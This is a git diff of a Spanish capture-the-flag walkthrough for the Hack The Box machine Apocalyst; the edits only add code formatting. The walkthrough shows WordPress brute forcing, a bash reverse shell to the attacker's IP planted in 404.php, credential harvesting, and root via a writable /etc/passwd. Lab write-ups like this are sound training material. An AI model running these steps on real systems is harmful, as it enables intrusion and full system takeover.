@@ -35,13 +35,13 @@ image:
   
 ## Descripción
 
-Apocalyst es una máquina medium linux, la web es un Wordpress así que obtenemos el usuario debido al nombre del autor de un artículo, nos montamos un diccionario con cewl y fuzzeando rutas con encontramos con una imagen con contenido oculto. El contenido oculto es una lista de palabras, usamos esta lista para bruteforcear el panel de login del Wordpres ganando así acceso, desde el Wordpress ganamos acceso a la máquina víctima modificando el archivo 404.php. Una vez dentro vemos un archivo con la contraseña de un usuario lo que nos permite cambiar de usuario, posteriormente usamos linpeas para analizar el sistema y sobrescribimos el /etc/passwd convirtiéndonos así en usuario root
+`Apocalyst` es una máquina `medium linux`, la `web` es un `Wordpress` así que obtenemos el usuario debido al `nombre` del `autor` de un artículo, nos montamos un `diccionario` con `cewl` y `fuzzeando rutas` con encontramos con una `imagen` con `contenido oculto`. El `contenido oculto` es una `lista` de `palabras`, usamos esta `lista` para `bruteforcear` el panel de `login` del `Wordpres` ganando así `acceso`, desde el `Wordpress` ganamos `acceso` a la máquina víctima `modificando` el archivo `404.php`. Una vez dentro vemos un `archivo` con la `contraseña` de un `usuario` lo que nos permite `cambiar` de `usuario`, posteriormente usamos `linpeas` para `analizar` el `sistema` y `sobrescribimos` el `/etc/passwd` convirtiéndonos así en usuario `root`
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.156.119
@@ -57,7 +57,7 @@ rtt min/avg/max/mdev = 55.527/59.388/63.546/3.280 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
+Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.156.119 -oG openPorts 
@@ -80,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
            Raw packets sent: 66855 (2.942MB) | Rcvd: 66858 (2.674MB)
 ```
 
-Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p22,80 10.129.156.119 -oN services 
@@ -106,15 +106,15 @@ Nmap done: 1 IP address (1 host up) scanned in 17.78 seconds
 
 ### Web Enumeration
 
-En la página web vemos lo siguiente
+En la página `web` vemos lo siguiente
 
 ![](/assets/img/Apocalyst/image_1.png)
 
-Al pinchar sobre el enlace nos redirige al dominio apocalyst.htb
+Al `pinchar` sobre el `enlace` nos `redirige` al dominio `apocalyst.htb`
 
 ![](/assets/img/Apocalyst/image_2.png)
 
-Añadimos el dominio al /etc/hosts
+`Añadimos` el `dominio` al `/etc/hosts`
 
 ```
 127.0.0.1       localhost
@@ -127,25 +127,25 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Al acceder nuevamente al servicio web vemos esto
+Al acceder nuevamente al servicio `web` vemos esto
 
 ![](/assets/img/Apocalyst/image_3.png)
 
-Si pinchamos sobre un artículo podemos ver quién es su autor
+Si `pinchamos` sobre un `artículo` podemos ver quién es su autor
 
 ![](/assets/img/Apocalyst/image_4.png)
 
-Este usuario es un usuario válido, lo podemos comprobar en /wp-login.php
+Este `usuario` es un usuario `válido`, lo podemos comprobar en `/wp-login.php`
 
 ![](/assets/img/Apocalyst/image_5.png)
 
-Como hay mucho texto en la web vamos a crearnos un diccionario personalizado
+Como hay `mucho texto` en la web vamos a `crearnos` un `diccionario personalizado`
 
 ```
 # cewl http://apocalyst.htb/ > wordlist.txt
 ```
 
-Fuzzeamos con wfuzz
+`Fuzzeamos` con `wfuzz`
 
 ```
 # wfuzz -c -t100 --hc 404 -w wordlist.txt --hh 157 -L http://apocalyst.htb/FUZZ   
@@ -168,11 +168,11 @@ Filtered Requests: 533
 Requests/sec.: 100.6532
 ```
 
-Vemos esto al acceder a /Rightiousness, con las demás rutas también veíamos esta imagen, sin embargo, los caracteres son diferentes, lo que significa que hay información oculta
+Vemos esto al acceder a `/Rightiousness`, con las demás rutas también veíamos esta imagen, sin embargo, los `caracteres` son `diferentes`, lo que significa que hay `información oculta`
 
 ![](/assets/img/Apocalyst/image_6.png)
 
-Vemos el contenido oculto de la imagen debido a que no está protegida por ninguna contraseña
+`Vemos` el `contenido oculto` de la `imagen` debido a que no está protegida por ninguna contraseña
 
 ```
 # teghide extract -sf image.jpg
@@ -182,7 +182,7 @@ wrote extracted data to "list.txt".
 
 ## Web Exploitation
 
-Mediante wpscan hacemos bruteforce contra el panel de login del Wordpress
+Mediante `wpscan` hacemos `bruteforce` contra el `panel` de `login` del Wordpress
 
 ```
 # wpscan --url http://apocalyst.htb -U falaraki -P list.txt 
@@ -286,17 +286,17 @@ Trying falaraki / total Time: 00:01:02 <========================================
 [+] Elapsed time: 00:01:55 
 ```
 
-Una vez accedemos al Wordpress con las credenciales falaraki:Transclisiation vemos lo siguiente
+Una vez `accedemos` al `Wordpress` con las credenciales `falaraki:Transclisiation` vemos lo siguiente
 
 ![](/assets/img/Apocalyst/image_7.png)
 
 ## Intrusión
 
-A continuación vamos a mandarnos una reverse shell a nuestro equipo, para ello pulsamos en Appearance y luego en Editor
+A continuación vamos a mandarnos una reverse shell a nuestro equipo, para ello pulsamos en `Appearance` y luego en `Editor`
 
 ![](/assets/img/Apocalyst/image_8.png)
 
-Pulsamos en el template Error 404
+Pulsamos en el template `Error 404`
 
 ![](/assets/img/Apocalyst/image_9.png)
 
@@ -308,13 +308,13 @@ system("bash -c 'bash -i >& /dev/tcp/10.10.16.35/9993 0>&1'");
 
 ![](/assets/img/Apocalyst/image_10.png)
 
-Una vez hecho nos pulsamos en Update File en la parte inferior de la web y nos ponemos en escucha mediante netcat por el puerto 9993
+Una vez hecho nos pulsamos en `Update File` en la parte inferior de la web y nos ponemos en escucha mediante netcat por el puerto 9993
 
 ```
 # nc -nlvp 9993
 ```
 
-Debemos provocar un error en la web, para ello podemos acceder a http://apocalyst.htb/?p=0, al no existir ese artículo se produce un error y nos manda la shell
+Debemos provocar un error en la web, para ello podemos acceder a `http://apocalyst.htb/?p=0`, al no existir ese artículo se produce un error y nos manda la shell
 
 ```
 # nc -nlvp 9993 
@@ -327,14 +327,14 @@ whoami
 www-data
 ```
 
-A continuación vamos a realizar un tratamiento a la TTY, para ello obtenemos las dimensiones de nuestra pantalla 
+A continuación vamos a realizar un tratamiento a la `TTY`, para ello obtenemos las `dimensiones` de nuestra `pantalla` 
 
 ```
 # stty size
 45 183
 ```
 
-Efectuamos el tratamiento a la TTY
+Efectuamos el `tratamiento` a la `TTY`
 
 ```
 # script /dev/null -c bash
@@ -352,7 +352,7 @@ Efectuamos el tratamiento a la TTY
 [ENTER]
 ```
 
-Ya estamos en una TTY completamente interactiva
+Ya estamos en una `TTY` completamente `interactiva`
 
 ```
 www-data@apocalyst:/var/www/html/apocalyst.htb$ whoami
@@ -361,7 +361,7 @@ www-data
 
 ## Privilege Escalation
 
-Obtenemos las credenciales de la base de datos del wp-config.php, sin embargo, no nos sirve de nada debido a que en la base de datos no hay nada interesante
+`Obtenemos` las `credenciales` de la `base de datos` del `wp-config.php`, sin embargo, `no` nos `sirve de nada` debido a que en la `base de datos` no hay `nada interesante`
 
 ```
 www-data@apocalyst:/var/www/html/apocalyst.htb$ cat wp-config.php
@@ -372,7 +372,7 @@ define('DB_USER', 'root');
 define('DB_PASSWORD', 'Th3SoopaD00paPa5S!');
 ```
 
-Nos encontramos esto en el directorio de falaraki
+Nos encontramos esto en el `directorio` de `falaraki`
 
 ```
 www-data@apocalyst:/home/falaraki$ ls -a
@@ -381,7 +381,7 @@ www-data@apocalyst:/home/falaraki$ cat .secret
 S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M=
 ```
 
-Como es base64 podemos descifrarlo fácilmente
+Como es `base64` podemos `descifrarlo` fácilmente
 
 ```
 # echo S2VlcCBmb3JnZXR0aW5nIHBhc3N3b3JkIHNvIHRoaXMgd2lsbCBrZWVwIGl0IHNhZmUhDQpZMHVBSU50RzM3VGlOZ1RIIXNVemVyc1A0c3M= | base64 -d
@@ -389,7 +389,7 @@ Keep forgetting password so this will keep it safe!
 Y0uAINtG37TiNgTH!sUzersP4ss
 ```
 
-Nos convertimos en el usuario falaraki
+Nos `convertimos` en el usuario `falaraki`
 
 ```
 www-data@apocalyst:/home/falaraki$ su falaraki
@@ -398,13 +398,13 @@ falaraki@apocalyst:~$ whoami
 falaraki
 ```
 
-Nos descargamos linpeas [https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) y nos montamos un servidor http con python en el directorio donde se encuentra linpeas
+Nos descargamos `linpeas` [https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) y nos montamos un `servidor http` con `python` en el `directorio` donde se encuentra linpeas
 
 ```
 # python -m http.server 80
 ```
 
-Nos descargamos linpeas en la máquina víctima
+Nos descargamos `linpeas` en la `máquina víctima`
 
 ```
 falaraki@apocalyst:~$ wget http://10.10.16.35/linpeas.sh
@@ -419,14 +419,14 @@ linpeas.sh.1                                  100%[=============================
 2024-08-03 19:30:56 (650 KB/s) - ‘linpeas.sh.1’ saved [862777/862777]
 ```
 
-Al ejecutar linpeas vemos que tenemos permisos de escritura sobre el /etc/passwd, por lo tanto podemos cambiarle la contraseña a cualquier usuario
+Al ejecutar `linpeas` vemos que tenemos `permisos` de `escritura` sobre el `/etc/passwd`, por lo tanto podemos `cambiarle` la `contraseña` a `cualquier usuario`
 
 ```
 falaraki@apocalyst:~$ ls -l /etc/passwd
 -rw-rw-rw- 1 root root 1670 Aug  3 19:26 /etc/passwd
 ```
 
-Podemos ver el tipo de cifrado que se está empleando en el sistema
+Podemos ver el `tipo` de cifrado que se está empleando en el sistema
 
 ```
 falaraki@apocalyst:~$ su root
@@ -439,7 +439,7 @@ ENCRYPT_METHOD SHA512
 # Only used if ENCRYPT_METHOD is set to SHA256 or SHA512.
 ```
 
-Generamos un contraseña con opensssl
+`Generamos` un `contraseña` con `opensssl`
 
 ```
 # openssl passwd -1
@@ -449,7 +449,7 @@ Verifying - Password:
 $1$3Aq69l2R$roAAiqM88qPJVo9vf62c7/
 ```
 
-Si le pasamos el hash creado a hash-identifier vemos que la contraseña es md5, funcionará igualmente debido a que tiene el formato correcto, es decir, es para unix/linux
+Si le pasamos el `hash` creado a `hash-identifier` vemos que la contraseña es `md5`, funcionará igualmente debido a que tiene el `formato correcto`, es decir, es para `unix/linux`
 
 ```
 # hash-identifier
@@ -457,7 +457,7 @@ Si le pasamos el hash creado a hash-identifier vemos que la contraseña es md5, 
    #     __  __                     __           ______    _____           #
    #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
    #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
-   #     \ \  _  \  /'__\   / ,__\ \ \  _ \      \ \ \   \ \ \ \ \       #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
    #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
    #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
    #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
@@ -472,14 +472,14 @@ Possible Hashs:
 [+] MD5(Unix)
 ```
 
-Nos abrimos el /etc/passwd con nano y cambiamos la x que es donde va la contraseña por la contraseña que hemos creado
+Nos `abrimos` el `/etc/passwd` con nano y `cambiamos` la `x` que es donde va la `contraseña` por la `contraseña` que hemos `creado`
 
 ```
 # nano /etc/passwd 
 root:$1$3Aq69l2R$roAAiqM88qPJVo9vf62c7/:0:0:root:/root:/bin/bash
 ```
 
-Nos convertimos en usuario root
+Nos `convertimos` en usuario `root`
 
 ```
 falaraki@apocalyst:~$ su root
